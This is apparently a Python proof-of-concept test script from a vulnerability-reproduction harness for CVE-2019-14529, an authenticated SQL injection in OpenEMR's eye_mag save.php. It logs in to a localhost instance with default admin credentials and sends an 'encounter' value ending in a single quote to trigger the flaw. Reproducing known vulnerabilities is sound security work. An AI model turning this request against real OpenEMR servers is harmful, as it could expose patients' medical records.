#!/usr/bin/env python3
"""
[APP] OpenEMR 
[CVE] CVE-2019-14529
[TYPE] SQL injection
[METHOD] POST
[CRASH_FIELDS] encounter
[TARGET_URL] http://localhost/openemr/interface/forms/eye_mag/save.php
[PARAMS] action=store_PDF&mode=update&encounter=1'
OpenEMR SQL injection vulnerability that requires administrator authentication
First login to /interface/main/main_screen.php, then POST to /interface/forms/eye_mag/save.php
"""

import sys
import os

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # CVE-2019-14529 specific configuration
    base_url = 'http://localhost/openemr'
    login_path = '/interface/main/main_screen.php?auth=login&site=default'
    
    # Login payload based on the provided configuration
    login_payload = {
        'new_login_session_management': '1',
        'authProvider': 'Default',
        'authUser': 'admin',
        'clearPass': 'pass',
        'languageChoice': '1'
    }
    
    # POC target URL and payload
    poc_url = 'http://localhost/openemr/interface/forms/eye_mag/save.php'
    poc_payload = {
        'action': 'store_PDF',
        'mode': 'update',
        'encounter': "2'"  # SQL injection payload - encounter parameter with single quote
    }
    
    # Run authenticated POC test using the helper function
    # Disable coverage during login as requested
    exit_code = run_authenticated_poc(
        base_url=base_url,
        login_path=login_path,
        login_payload=login_payload,
        poc_url=poc_url,
        poc_payload=poc_payload,
        method=metadata['method'],
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type'],
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
